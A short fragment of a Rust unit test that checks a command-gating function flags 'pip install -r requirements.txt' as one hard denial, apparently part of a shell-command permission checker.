        assert_eq!(gate_hard_denies("pip install -r requirements.txt").len(), 1);
    }
}
